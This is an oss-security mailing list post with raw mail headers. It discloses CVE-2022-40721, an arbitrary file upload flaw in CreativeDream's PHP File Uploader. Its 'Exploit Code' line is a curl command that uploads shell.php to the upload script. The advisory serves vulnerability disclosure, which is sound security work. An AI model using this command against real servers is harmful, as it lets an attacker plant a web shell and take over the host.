Received: (qmail 27993 invoked by uid 550); 3 Oct 2022 16:17:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27960 invoked from network); 3 Oct 2022 16:17:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
	t=1664813865; bh=uiNC9F+aYAqjuPLxKVyu9/wByY9Z4u/0HHZ8Hgj2Mkg=;
	h=From:Content-Type:Mime-Version:Subject:Message-Id:Date:To;
	b=jv80JQe623LI2A+6gMBsyiqOudfGH81GVyvurNoFh/qKKKCanXLadXL0zN9By1DIX
	 v1TJrtFWqSH6eiYtli9OOqBjZa9XS54kMZAcgtxCdnFwyM2PsQnHkyiobcf6q7UUWw
	 uaBHreotkFG/XEPTekrcJYE4oqM3RxD702x6w/oQsTn+ONqxxJelMQyp2oaeo7/Scy
	 rLsyHDercHYMe4p8OwBfzcn3AbvJQE5gJb5Yq3cJg/2lpZj28AN/7y234EogW8CXp/
	 fSwiaufQWS9vXc2t3UMS4jE3xd1vzPM5fJ3Q8SFaJjBkMhXmPDVKQe6R4M/slKv0Fi
	 Fbs2xwHbTYh4A==
From: Larry Cashdollar <larry0@me.com>
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3696.120.41.1.1\))
Message-Id: <9FDC9C96-19F9-4651-B66D-379E07896378@me.com>
Date: Mon, 3 Oct 2022 12:17:43 -0400
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3696.120.41.1.1)
X-Proofpoint-GUID: 5COCaxKtgZT4qmCTivSl-z_6RJSLG-WI
X-Proofpoint-ORIG-GUID: 5COCaxKtgZT4qmCTivSl-z_6RJSLG-WI
X-Proofpoint-Virus-Version: =?UTF-8?Q?vendor=3Dfsecure_engine=3D1.1.170-22c6f66c430a71ce266a39bfe25bc?=
 =?UTF-8?Q?2903e8d5c8f:6.0.138,18.0.572,17.11.64.514.0000000_definitions?=
 =?UTF-8?Q?=3D2020-02-14=5F11:2020-02-14=5F02,2020-02-14=5F11,2022-02-23?=
 =?UTF-8?Q?=5F01_signatures=3D0?=
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 malwarescore=0 spamscore=0 adultscore=0
 mlxlogscore=805 suspectscore=0 mlxscore=0 clxscore=1011 bulkscore=0
 phishscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2209130000 definitions=main-2210030097
Subject: [oss-security] CreativeDream software arbitrary file upload


Title: CreativeDream software arbitrary file upload
Author: Larry W. Cashdollar
Date: 2022-09-08
CVE-ID:[CVE-2022-40721]
Download Site: https://github.com/CreativeDream
Vendor: CreativeDream
Vendor Notified: 2020-02-19
Vendor Contact: yuliangagarin [at] mail.ru
References: https://github.com/CreativeDream/php-uploader/issues/23
Advisory: http://www.vapidlabs.com/advisory.php?v=3D216
Description: PHP File Uploader is an easy to use, hi-performance File Uploa=
d Script which allows you to upload/download files to webserver.
Vulnerability:
The software allows executable file uploads to the web root directory.
Export: JSON TEXT XML
Exploit Code:
	=E2=80=A2 curl -vk http://localhost/php-uploader/examples/upload.php -F "f=
iles=3D@shell.php"

